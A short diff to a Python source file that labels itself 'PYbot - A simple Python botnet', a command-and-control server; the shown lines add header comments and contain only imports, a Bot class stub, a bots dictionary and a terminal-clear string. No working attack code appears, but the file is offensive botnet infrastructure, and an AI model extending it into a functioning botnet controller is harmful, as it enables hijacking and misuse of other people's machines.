@@ -1,3 +1,7 @@
+# PYbot - A simple Python botnet
+# Author: WodX
+# Date: 27/09/2019
+# CnC server
 
 import socket
 import threading
@@ -14,7 +18,6 @@ class Bot:
         self.protocol = protocol
 
 bots = {}
-
 ansi_clear = '\033[2J\033[H'
 
 banner = '''
